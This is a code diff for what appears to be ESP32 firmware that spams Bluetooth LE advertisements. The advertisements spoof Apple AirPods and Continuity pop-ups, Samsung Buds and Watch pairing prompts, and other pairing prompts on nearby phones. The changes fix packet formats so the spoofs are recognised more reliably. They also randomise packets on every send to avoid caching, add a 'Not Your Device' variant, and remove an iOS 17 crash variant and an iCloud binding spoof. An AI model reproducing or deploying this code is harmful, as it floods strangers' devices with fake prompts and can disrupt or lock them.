-    return i;
-}
-
-// Builds a dynamic Apple Continuity advertisement into advertisementData.
-// For Apple Action modals — uses NearbyAction and CustomCrash variants only,
-// since ProximityPair is the pairing device format used by Apple Pairing path.
+// Builds a dynamic Apple Continuity NearbyAction (Action modal) advertisement.
+// Previously alternated 50/50 with a "CustomCrash" variant that appended 6
+// bytes past the declared Continuity Size — not a real Continuity TLV, so
+// roughly half of all Action packets were malformed and silently dropped by
+// iOS. Always emit the real NearbyAction format now.
 static bool bleSpamBuildAppleContinuityAdvertisement(BLEAdvertisementData &advertisementData) {
     uint8_t buf[31];
-    size_t len = 0;
-    // 50/50 between NearbyAction and CustomCrash (iOS 17 lockup variant)
-    if (esp_random() % 2 == 0) {
-        len = bleSpamBuildContinuityNearbyAction(buf);
-    } else {
-        len = bleSpamBuildContinuityCustomCrash(buf);
-    }
+    size_t len = bleSpamBuildContinuityNearbyAction(buf);
     if (len == 0) return false;
+    advertisementData = BLEAdvertisementData();
+    advertisementData.setFlags(0x06);
 #ifdef NIMBLE_V2_PLUS
     advertisementData.addData(buf, len);
 #else
@@ -1401,48 +1199,19 @@ static bool bleSpamBuildAdvertisementData(
     switch (attackType) {
 #if !defined(LITE_VERSION)
         case BLE_SPAM_ATTACK_APPLE_PAIRING: {
-            // Pairing devices (AirPods, Beats etc.) use device-specific static payloads
-            // from apple_spam.cpp — each payload corresponds to a specific hardware model
-            int payloadIndex = bleSpamGetApplePayloadIndex(attackType, deviceIndex);
-            return buildAppleSpamAdvertisement(payloadIndex, advertisementData);
+            // ProximityPair device popup (AirPods, Beats etc.) — prefix 0x07 = new device.
+            uint16_t deviceId = bleSpamResolveProximityDeviceId(deviceIndex);
+            return buildAppleProximityPair(0x07, deviceId, advertisementData);
         }
         case BLE_SPAM_ATTACK_APPLE_ACTION: {
             // Action modals (SetupNewPhone, AppleTV etc.) use dynamic Continuity NearbyAction
             // packets (MarlinSchuck) — these trigger iOS popups more reliably than static payloads
             return bleSpamBuildAppleContinuityAdvertisement(advertisementData);
         }
-        case BLE_SPAM_ATTACK_APPLE_ENHANCED: {
-            // iCloud binding spoof (Ninja-jr) — random binding pattern + random fields per packet
-            uint8_t packet[31];
-            int patternIdx = esp_random() % (sizeof(ICBOUND_PATTERNS) / sizeof(ICBOUND_PATTERNS[0]));
-            const iCloudBinding *pattern = &ICBOUND_PATTERNS[patternIdx];
-            int pos = 0;
-            packet[pos++] = 0x1A;
-            packet[pos++] = 0xFF;
-            packet[pos++] = 0x4C;
-            packet[pos++] = 0x00;
-            packet[pos++] = 0x07;
-            packet[pos++] = 0x19;
-            packet[pos++] = 0x02 | (esp_random() & 0x0F);
-            packet[pos++] = pattern->flags;
-            packet[pos++] = pattern->sig1;
-            packet[pos++] = pattern->sig2;
-            packet[pos++] = pattern->status;
-            packet[pos++] = pattern->state;
-            packet[pos++] = pattern->reserved1;
-            packet[pos++] = pattern->reserved2;
-            packet[pos++] = pattern->modelMagic;
-            esp_fill_random(&packet[pos], 12);
-            pos += 12;
-            advertisementData = BLEAdvertisementData();
-            advertisementData.setFlags(0x06);
-#ifdef NIMBLE_V2_PLUS
-            advertisementData.addData(packet, pos);
-#else
-            std::vector<uint8_t> dataVec(packet, packet + pos);
-            advertisementData.addData(dataVec);
-#endif
-            return true;
+        case BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE: {
+            // Same ProximityPair format, prefix 0x01 = "Not Your Device" variant.
+            uint16_t deviceId = bleSpamResolveProximityDeviceId(deviceIndex);
+            return buildAppleProximityPair(0x01, deviceId, advertisementData);
         }
 #endif
         case BLE_SPAM_ATTACK_ANDROID_ALERT: {
@@ -1500,7 +1269,7 @@ static bool bleSpamBuildAdvertisementData(
 
             if (sendBuds) {
                 uint32_t model = samsung_buds_models[random(samsung_buds_count)];
-                uint8_t Buds_Data[28];
+                uint8_t Buds_Data[31];
                 uint8_t bi = 0;
                 Buds_Data[bi++] = 27;
                 Buds_Data[bi++] = 0xFF;
@@ -1530,6 +1299,13 @@ static bool bleSpamBuildAdvertisementData(
                 Buds_Data[bi++] = 0x00;
                 Buds_Data[bi++] = 0xC7;
                 Buds_Data[bi++] = 0x00;
+                // Trailing truncated record (length=0x10 claimed, only 2 data
+                // bytes present) — ported from the Flipper Zero ble_spam app.
+                // Real Galaxy Buds advertise this stub second record; without
+                // it Samsung's scanner doesn't recognize the packet.
+                Buds_Data[bi++] = 0x10;
+                Buds_Data[bi++] = 0xFF;
+                Buds_Data[bi++] = 0x75;
 #ifdef NIMBLE_V2_PLUS
                 AdvData.addData(Buds_Data, bi);
 #else
@@ -1539,7 +1315,7 @@ static bool bleSpamBuildAdvertisementData(
             } else {
                 uint8_t model = watch_models[random(watch_models_count)].value;
                 uint8_t Watch_Data[15] = {
-                    0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, model
+                    0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, model
                 };
 #ifdef NIMBLE_V2_PLUS
                 AdvData.addData(Watch_Data, 15);
@@ -1617,8 +1393,10 @@ static bool bleSpamBuildAdvertisementData(
 static bool bleSpamIsCacheable(BleSpamAttackType attackType) {
     // beacon with empty name = random every packet, never cache
     if (attackType == BLE_SPAM_ATTACK_BLE_BEACON && bleSpamBeaconName.length() == 0) return false;
-    return attackType == BLE_SPAM_ATTACK_APPLE_PAIRING || attackType == BLE_SPAM_ATTACK_APPLE_ACTION ||
-           attackType == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR || attackType == BLE_SPAM_ATTACK_BLE_BEACON;
+    // Apple Pairing and Action both regenerate random fields (battery/encrypted
+    // payload/auth tag) on every build call and must not be cached, or the same
+    // randomized packet would be replayed forever instead of looking fresh.
+    return attackType == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR || attackType == BLE_SPAM_ATTACK_BLE_BEACON;
 }
 
 static const BLEAdvertisementData *
@@ -1684,6 +1462,14 @@ static void bleSpamDeinitAdvertiser() {
     esp_bt_controller_deinit();
 #else
     BLEDevice::deinit();
+#endif
+#ifdef CONFIG_BT_NIMBLE_ENABLED
+    // NimBLEDevice::m_ownAddrType is a static class member that survives
+    // deinit()/init() cycles. bleSpamRestartAdvertiserForMac() flips it to
+    // BLE_OWN_ADDR_RANDOM for MAC rotation; every other module's scan/connect/
+    // advertise call reads that same static value, so leaving it set breaks
+    // all Bluetooth elsewhere in the firmware until a reboot clears statics.
+    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC);
 #endif
 }
 
